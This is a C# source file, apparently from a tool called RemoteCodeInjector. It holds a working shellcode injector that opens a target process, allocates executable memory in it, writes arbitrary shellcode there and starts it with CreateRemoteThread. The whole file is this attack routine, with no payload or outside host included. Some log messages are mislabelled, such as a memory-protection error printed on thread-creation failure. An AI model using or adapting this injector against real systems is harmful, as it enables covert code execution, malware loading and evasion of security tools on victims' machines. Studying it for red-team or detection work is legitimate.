using System;
using System.IO;
using System.Runtime.InteropServices;
using RemoteCodeInjector.Interop;

namespace RemoteCodeInjector.Library
{
    using SIZE_T = UIntPtr;

    internal class Modules
    {
        public static bool InjectShellcodeToProcess(int pid, string filePath)
        {
            bool status;
            byte[] shellcode;
            string fullPathName = Path.GetFullPath(filePath);

            if (!File.Exists(fullPathName))
            {
                Console.WriteLine("[-] The specified file does not exist.");
                status = false;
            }
            else
            {
                try
                {
                    shellcode = File.ReadAllBytes(fullPathName);
                    status = InjectShellcodeToProcess(pid, shellcode);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to read shellcode.");
                    status = false;
                }
            }

            return status;
        }


        public static bool InjectShellcodeToProcess(int pid, byte[] shellcode)
        {
            int error;
            bool status;
            IntPtr hProcess;
            IntPtr hThread;
            IntPtr pShellcodeBuffer;
            string addressFormat = Environment.Is64BitProcess ? "X16" : "X8";

            Console.WriteLine("[>] Trying to write open the target process.");

            hProcess = NativeMethods.OpenProcess(
                ProcessAccessFlags.PROCESS_CREATE_THREAD | ProcessAccessFlags.PROCESS_VM_OPERATION | ProcessAccessFlags.PROCESS_VM_WRITE,
                false,
                pid);

            if (hProcess == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to open the target process.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));

                return false;
            }
            else
            {
                Console.WriteLine("[+] The target process is opened succesfully (hProcess = 0x{0}).", hProcess.ToString("X"));
            }

            do
            {
                Console.WriteLine("[>] Trying to allocate memory.");

                pShellcodeBuffer = NativeMethods.VirtualAllocEx(
                    hProcess,
                    IntPtr.Zero,
                    shellcode.Length,
                    ALLOCATION_TYPE.COMMIT | ALLOCATION_TYPE.RESERVE,
                    MEMORY_PROTECTION.EXECUTE_READ);
                status = (pShellcodeBuffer != IntPtr.Zero);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to allocate shellcode buffer.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));

                    break;
                }
                else
                {
                    Console.WriteLine("[+] Shellcode buffer is allocated at 0x{0}.", pShellcodeBuffer.ToString(addressFormat));
                }

                Console.WriteLine("[>] Trying to write shellcode to the target process.");

                status = NativeMethods.WriteProcessMemory(
                    hProcess,
                    pShellcodeBuffer,
                    shellcode,
                    new SIZE_T((uint)shellcode.Length),
                    out SIZE_T nWrittenBytes);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to write shellcode.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));

                    break;
                }
                else
                {
                    Console.WriteLine("[+] {0} bytes shellcode are written successfully.", nWrittenBytes);
                }

                Console.WriteLine("[>] Trying to create shellcode thread.");

                hThread = NativeMethods.CreateRemoteThread(
                    hProcess,
                    IntPtr.Zero,
                    SIZE_T.Zero,
                    pShellcodeBuffer,
                    IntPtr.Zero,
                    ThreadCreationFlags.IMMEDIATE,
                    out int nThreadId);
                status = (hThread != IntPtr.Zero);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to update memory protection for shellcode buffer.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));

                    break;
                }
                else
                {
                    Console.WriteLine("[+] Shellcode is created successfully.");
                    Console.WriteLine("    [*] TID     : {0}", nThreadId);
                    Console.WriteLine("    [*] hTHread : 0x{0}", hThread.ToString("X"));

                    NativeMethods.CloseHandle(hThread);
                }
            } while (false);

            NativeMethods.CloseHandle(hProcess);

            Console.WriteLine("[*] Done.");

            return status;
        }
    }
}
